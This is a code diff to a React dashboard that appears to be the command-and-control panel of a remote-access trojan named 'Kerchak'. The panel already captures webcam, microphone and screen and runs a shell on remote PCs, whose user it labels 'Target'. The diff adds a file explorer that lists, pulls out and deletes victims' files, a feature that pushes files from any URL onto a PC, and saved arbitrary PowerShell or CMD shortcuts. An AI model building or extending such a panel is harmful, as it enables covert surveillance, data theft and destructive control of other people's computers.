@@ -2,7 +2,7 @@
 
 import { useEffect, useState, useRef } from 'react';
 import { supabase } from '@/lib/supabase';
-import { Monitor, Power, RefreshCw, ShieldAlert, Terminal, Camera, Mic, MessageSquare, Shield, Activity, X, Video, ChevronRight } from 'lucide-react';
+import { Monitor, Power, RefreshCw, ShieldAlert, Terminal, Camera, Mic, MessageSquare, Shield, Activity, X, Video, ChevronRight, Folder, Settings, Download, Trash2, FileText, Play, Plus, Edit2, Save, Upload } from 'lucide-react';
 
 interface Computer {
   id: string;
@@ -28,6 +28,16 @@ export default function Dashboard() {
   const [terminalOutput, setTerminalOutput] = useState<string[]>(["Kerchak OS [Version 10.0.22631.3296]", "(c) 2026 Kerchak Corporation. All rights reserved.", ""]);
   const [terminalInput, setTerminalInput] = useState("");
   const terminalEndRef = useRef<HTMLDivElement>(null);
+
+  // File Explorer State
+  const [explorerPath, setExplorerPath] = useState("C:\\");
+  const [explorerFiles, setExplorerFiles] = useState<{name:string, isDir:boolean, size:number}[]>([]);
+  const [isExplorerLoading, setIsExplorerLoading] = useState(false);
+
+  // Saved Commands State
+  const [savedCommands, setSavedCommands] = useState<{id:string, name:string, cmd:string, args:string, hasParams:boolean}[]>([]);
+  const [isCreatingCommand, setIsCreatingCommand] = useState(false);
+  const [newCmd, setNewCmd] = useState({name:'', cmd:'', args:'', hasParams:false});
 
   const scrollToBottom = () => {
     terminalEndRef.current?.scrollIntoView({ behavior: "smooth" });
@@ -159,6 +169,91 @@ export default function Dashboard() {
     if (cmd === 'chat_open') {
       setActiveModal('chat');
     }
+  };
+
+  useEffect(() => {
+    const saved = localStorage.getItem('kerchak_shortcuts');
+    if (saved) setSavedCommands(JSON.parse(saved));
+  }, []);
+
+  const saveCommand = () => {
+    if (!newCmd.name || !newCmd.cmd) return;
+    const cmd = { ...newCmd, id: Math.random().toString(36).substr(2, 9) };
+    const updated = [...savedCommands, cmd];
+    setSavedCommands(updated);
+    localStorage.setItem('kerchak_shortcuts', JSON.stringify(updated));
+    setNewCmd({name:'', cmd:'', args:'', hasParams:false});
+    setIsCreatingCommand(false);
+  };
+
+  const deleteSavedCommand = (id: string) => {
+    const updated = savedCommands.filter(c => c.id !== id);
+    setSavedCommands(updated);
+    localStorage.setItem('kerchak_shortcuts', JSON.stringify(updated));
+  };
+
+  const runSavedCommand = async (sc: typeof savedCommands[0]) => {
+    if (!selectedPc || !selectedPcName) return;
+    let finalArgs = sc.args;
+    if (sc.hasParams) {
+      const p = window.prompt("Enter parameters for: " + sc.name);
+      if (p === null) return;
+      finalArgs = finalArgs.replace(/%p%/g, p);
+    }
+    await sendCommand(selectedPc, selectedPcName, sc.cmd as any, finalArgs);
+    alert(`Shortcut "${sc.name}" triggered.`);
+  };
+
+  const openExplorer = async (pcId: string, pcName: string) => {
+    setSelectedPc(pcId);
+    setSelectedPcName(pcName);
+    setActiveModal('explorer');
+    fetchFiles("C:\\");
+  };
+
+  const fetchFiles = async (path: string) => {
+    if (!selectedPc) return;
+    setIsExplorerLoading(true);
+    setExplorerPath(path);
+
+    const { data } = await supabase.from('commands').insert({
+      computer_id: selectedPc,
+      command: 'ls',
+      args: path,
+      status: 'pending'
+    }).select().single();
+
+    if (data) {
+      const check = setInterval(async () => {
+        const { data: res } = await supabase.from('commands').select('result, status').eq('id', data.id).single();
+        if (res?.status === 'executed' && res.result) {
+          try {
+            setExplorerFiles(JSON.parse(res.result));
+          } catch(e) {}
+          setIsExplorerLoading(false);
+          clearInterval(check);
+        }
+      }, 1000);
+      setTimeout(() => { clearInterval(check); setIsExplorerLoading(false); }, 15000);
+    }
+  };
+
+  const downloadFile = async (name: string) => {
+    if (!selectedPc) return;
+    const fullPath = explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + name;
+    const { data } = await supabase.from('commands').insert({
+      computer_id: selectedPc, command: 'dl', args: fullPath, status: 'pending'
+    }).select().single();
+    alert("Download requested. Wait for storage upload...");
+  };
+
+  const deleteFile = async (name: string) => {
+    if (!selectedPc || !window.confirm(`Delete ${name}?`)) return;
+    const fullPath = explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + name;
+    await supabase.from('commands').insert({
+      computer_id: selectedPc, command: 'rm', args: fullPath, status: 'pending'
+    });
+    setTimeout(() => fetchFiles(explorerPath), 2000);
   };
 
   const startLiveStream = async (pcId: string, pcName: string) => {
@@ -405,13 +500,151 @@ export default function Dashboard() {
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'chat_open')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-pink-400 transition-colors" title="Chat Box"><MessageSquare size={18} /></button>
 
                 <button onClick={() => { setActivePC(pc.pc_name); setShowTerminal(true); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-gray-300 transition-colors" title="Open Terminal (CMD)"><Terminal size={18} /></button>
+                <button onClick={() => openExplorer(pc.id, pc.pc_name)} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-blue-400 transition-colors" title="File Explorer"><Folder size={18} /></button>
+                <button onClick={() => { setSelectedPc(pc.id); setSelectedPcName(pc.pc_name); setActiveModal('saved_commands'); }} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-yellow-400 transition-colors" title="Saved Commands / Shortcuts"><Settings size={18} /></button>
                 <button onClick={() => sendCommand(pc.id, pc.pc_name, 'restart')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-orange-400 transition-colors" title="Restart PC"><RefreshCw size={18} /></button>
-                <button onClick={() => sendCommand(pc.id, pc.pc_name, 'shutdown')} className="p-2 bg-white/5 hover:bg-white/10 rounded-lg flex justify-center text-red-500 transition-colors" title="Shutdown PC"><Power size={18} /></button>
               </div>
             </div>
           </div>
         ))}
       </div>
+
+      {/* File Explorer Modal */}
+      {activeModal === 'explorer' && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md p-4">
+          <div className="bg-[#0c0c0c] border border-white/10 rounded-2xl overflow-hidden w-full max-w-5xl shadow-2xl flex flex-col h-[700px]">
+            <div className="flex justify-between items-center p-5 border-b border-white/5 bg-white/5">
+              <div className="flex items-center gap-3">
+                <Folder className="text-blue-500" size={24} />
+                <h3 className="font-bold text-white text-lg">Explorer - {selectedPcName}</h3>
+              </div>
+              <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white transition-colors"><X size={24} /></button>
+            </div>
+            <div className="bg-[#1a1a1c] p-3 flex gap-2 items-center px-5 border-b border-white/5">
+              <button onClick={() => {
+                const parts = explorerPath.split('\\').filter(Boolean);
+                if (parts.length > 1) {
+                  parts.pop();
+                  const newPath = parts.join('\\') + (parts.length === 1 && parts[0].endsWith(':') ? '\\' : '');
+                  fetchFiles(newPath);
+                }
+              }} className="p-2 hover:bg-white/5 rounded text-gray-400"><ChevronRight size={18} className="rotate-180" /></button>
+              <input 
+                type="text" value={explorerPath} onChange={e => setExplorerPath(e.target.value)}
+                onKeyDown={e => e.key === 'Enter' && fetchFiles(explorerPath)}
+                className="flex-1 bg-black/40 border border-white/10 rounded-lg px-4 py-1.5 text-sm text-gray-300 focus:outline-none focus:border-blue-500"
+              />
+              <button onClick={() => {
+                const url = window.prompt("Enter direct URL of file to upload to PC:");
+                const name = window.prompt("Enter filename to save as:", url?.split('/').pop());
+                if (url && name && selectedPc) {
+                  const local = explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + name;
+                  sendCommand(selectedPc, selectedPcName!, 'ul', `${url}|${local}`);
+                  alert("Upload command sent.");
+                }
+              }} className="p-2 hover:bg-white/5 rounded text-green-400 flex items-center gap-2 text-xs font-bold"><Upload size={18} /> UPLOAD</button>
+              <button onClick={() => fetchFiles(explorerPath)} className="p-2 hover:bg-white/5 rounded text-blue-400"><RefreshCw size={18} className={isExplorerLoading ? 'animate-spin' : ''} /></button>
+            </div>
+            <div className="flex-1 overflow-y-auto p-4 custom-scrollbar">
+              {isExplorerLoading ? (
+                <div className="flex flex-col items-center justify-center h-full gap-4 text-gray-500">
+                  <RefreshCw size={40} className="animate-spin opacity-20" />
+                  <span className="animate-pulse">Loading directory content...</span>
+                </div>
+              ) : (
+                <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
+                  {explorerFiles.map((file, i) => (
+                    <div key={i} className="group relative bg-white/5 hover:bg-white/10 border border-white/5 rounded-xl p-4 transition-all cursor-pointer flex flex-col items-center text-center gap-2"
+                         onDoubleClick={() => file.isDir ? fetchFiles(explorerPath + (explorerPath.endsWith('\\') ? '' : '\\') + file.name) : null}>
+                      {file.isDir ? <Folder className="text-yellow-500 fill-yellow-500/20" size={48} /> : <FileText className="text-blue-400" size={48} />}
+                      <span className="text-xs text-gray-300 truncate w-full font-medium">{file.name}</span>
+                      {!file.isDir && <span className="text-[10px] text-gray-500">{(file.size / 1024 / 1024).toFixed(2)} MB</span>}
+                      
+                      <div className="absolute top-1 right-1 opacity-0 group-hover:opacity-100 flex gap-1 transition-opacity">
+                        {!file.isDir && <button onClick={(e) => { e.stopPropagation(); downloadFile(file.name); }} className="p-1 bg-green-500/20 text-green-400 rounded hover:bg-green-500/40" title="Download"><Download size={14} /></button>}
+                        <button onClick={(e) => { e.stopPropagation(); deleteFile(file.name); }} className="p-1 bg-red-500/20 text-red-400 rounded hover:bg-red-500/40" title="Delete"><Trash2 size={14} /></button>
+                      </div>
+                    </div>
+                  ))}
+                </div>
+              )}
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Saved Commands Modal */}
+      {activeModal === 'saved_commands' && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/90 backdrop-blur-md p-4">
+          <div className="bg-[#0c0c0c] border border-white/10 rounded-2xl overflow-hidden w-full max-w-4xl shadow-2xl flex flex-col h-[600px]">
+            <div className="flex justify-between items-center p-5 border-b border-white/5 bg-white/5">
+              <div className="flex items-center gap-3">
+                <Settings className="text-yellow-500" size={24} />
+                <h3 className="font-bold text-white text-lg">Command Shortcuts</h3>
+              </div>
+              <button onClick={() => setActiveModal(null)} className="text-gray-400 hover:text-white transition-colors"><X size={24} /></button>
+            </div>
+            <div className="p-6 overflow-y-auto flex-1 custom-scrollbar">
+              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
+                {savedCommands.map(sc => (
+                  <div key={sc.id} className="bg-white/5 border border-white/5 rounded-xl p-4 flex flex-col gap-3 group hover:border-yellow-500/30 transition-all">
+                    <div className="flex justify-between items-start">
+                      <div>
+                        <h4 className="font-bold text-white group-hover:text-yellow-400 transition-colors">{sc.name}</h4>
+                        <code className="text-[10px] text-gray-500 block mt-1 truncate">{sc.cmd}</code>
+                      </div>
+                      <div className="flex gap-2">
+                        <button onClick={() => runSavedCommand(sc)} className="p-2 bg-green-500/20 text-green-400 rounded-lg hover:bg-green-500/40"><Play size={16} /></button>
+                        <button onClick={() => deleteSavedCommand(sc.id)} className="p-2 bg-red-500/20 text-red-400 rounded-lg hover:bg-red-500/40"><Trash2 size={16} /></button>
+                      </div>
+                    </div>
+                  </div>
+                ))}
+                
+                <button onClick={() => setIsCreatingCommand(true)} className="border-2 border-dashed border-white/10 rounded-xl p-8 flex flex-col items-center justify-center gap-3 text-gray-500 hover:text-yellow-400 hover:border-yellow-500/40 transition-all">
+                  <Plus size={32} />
+                  <span className="font-bold uppercase tracking-widest text-xs">New Shortcut</span>
+                </button>
+              </div>
+            </div>
+            
+            {isCreatingCommand && (
+              <div className="absolute inset-0 bg-black/95 flex flex-col p-8 gap-6 animate-in fade-in zoom-in duration-200">
+                <div className="flex justify-between items-center">
+                  <h3 className="text-2xl font-bold text-white">Create Shortcut</h3>
+                  <button onClick={() => setIsCreatingCommand(false)} className="text-gray-400 hover:text-white"><X size={24} /></button>
+                </div>
+                <div className="grid grid-cols-1 gap-6">
+                  <div className="space-y-2">
+                    <label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Name</label>
+                    <input type="text" value={newCmd.name} onChange={e=>setNewCmd({...newCmd, name:e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-yellow-500" placeholder="Change Wallpaper" />
+                  </div>
+                  <div className="space-y-2">
+                    <label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Command Type</label>
+                    <select value={newCmd.cmd} onChange={e=>setNewCmd({...newCmd, cmd:e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-yellow-500">
+                      <option value="cmd">CMD Execution</option>
+                      <option value="chat_open">Open Chat</option>
+                      <option value="stream_start">Start Stream</option>
+                      <option value="ss">Screenshot</option>
+                    </select>
+                  </div>
+                  <div className="space-y-2">
+                    <label className="text-xs font-bold text-gray-500 uppercase tracking-widest">Args / Shell Command</label>
+                    <textarea value={newCmd.args} onChange={e=>setNewCmd({...newCmd, args:e.target.value})} className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-yellow-500 h-32 font-mono text-sm" placeholder="powershell -Command ..."></textarea>
+                  </div>
+                  <div className="flex items-center gap-3">
+                    <input type="checkbox" checked={newCmd.hasParams} onChange={e=>setNewCmd({...newCmd, hasParams:e.target.checked})} className="w-5 h-5 accent-yellow-500" />
+                    <label className="text-sm text-gray-300">Ask for parameters before executing</label>
+                  </div>
+                  <button onClick={saveCommand} className="mt-4 bg-yellow-500 hover:bg-yellow-400 text-black font-bold py-4 rounded-xl shadow-xl transition-all flex items-center justify-center gap-2">
+                    <Save size={20} /> Save Shortcut
+                  </button>
+                </div>
+              </div>
+            )}
+          </div>
+        </div>
+      )}
 
       {(activeModal === 'screenshot' || activeModal === 'webcam') && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
@@ -554,30 +787,25 @@ export default function Dashboard() {
       )}
       {showTerminal && (
         <div className="fixed inset-0 bg-black/90 backdrop-blur-md z-50 flex items-center justify-center p-4">
-          <div className="w-full max-w-5xl bg-[#0c0c0c] rounded-xl border border-white/10 shadow-[0_0_50px_rgba(0,0,0,0.5)] overflow-hidden font-mono flex flex-col h-[600px]">
-            <div className="bg-[#1a1a1c] px-4 py-3 flex justify-between items-center border-b border-white/5">
+          <div className="w-full max-w-5xl bg-[#0c0c0c] rounded-xl border border-white/10 shadow-[0_0_50px_rgba(255,0,0,0.2)] overflow-hidden font-mono flex flex-col h-[600px]">
+            <div className="bg-gradient-to-r from-red-950/50 to-[#1a1a1c] px-4 py-3 flex justify-between items-center border-b border-red-500/20">
               <div className="flex items-center gap-3 text-sm font-bold text-gray-300">
-                <div className="flex gap-1.5">
-                  <div className="w-3 h-3 rounded-full bg-red-500/50"></div>
-                  <div className="w-3 h-3 rounded-full bg-yellow-500/50"></div>
-                  <div className="w-3 h-3 rounded-full bg-green-500/50"></div>
-                </div>
-                <div className="h-4 w-[1px] bg-white/10 mx-1"></div>
-                <Terminal size={14} className="text-blue-400" />
-                <span className="tracking-tight uppercase text-[10px] letter-spacing-widest opacity-70">Administrator Command Prompt - {activePC}</span>
+                <Terminal size={14} className="text-red-500 animate-pulse" />
+                <span className="tracking-tight uppercase text-[10px] letter-spacing-widest text-red-400/80">Kerchak Administrator Shell - {activePC}</span>
               </div>
               <button onClick={() => setShowTerminal(false)} className="text-gray-500 hover:text-white transition-colors"><X size={20} /></button>
             </div>
-            <div className="flex-1 p-6 overflow-y-auto text-sm leading-relaxed custom-scrollbar bg-black/40">
+            <div className="flex-1 p-6 overflow-y-auto text-sm leading-relaxed custom-scrollbar bg-black/60 relative">
+              <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(220,38,38,0.05),transparent)] pointer-events-none"></div>
               {terminalOutput.map((line, i) => (
-                <div key={i} className="whitespace-pre-wrap break-all min-h-[1.2rem] mb-1 font-mono text-gray-300 selection:bg-blue-500/30">
+                <div key={i} className="whitespace-pre-wrap break-all min-h-[1.2rem] mb-1 font-mono text-gray-300 selection:bg-red-500/30">
                   {line}
                 </div>
               ))}
               <div className="flex gap-2 items-start mt-4 group">
-                <span className="text-blue-500 font-bold flex items-center gap-1 shrink-0">
-                  <ChevronRight size={16} />
-                  <span>C:\Users\{activePC?.split(' / ')[1] || 'Target'}&gt;</span>
+                <span className="text-red-500 font-bold flex items-center gap-1 shrink-0">
+                  <ChevronRight size={16} className="animate-gradient-red" />
+                  <span className="animate-gradient-red">C:\Users\{activePC?.split(' / ')[1] || 'Target'}&gt;</span>
                 </span>
                 <input
                   autoFocus
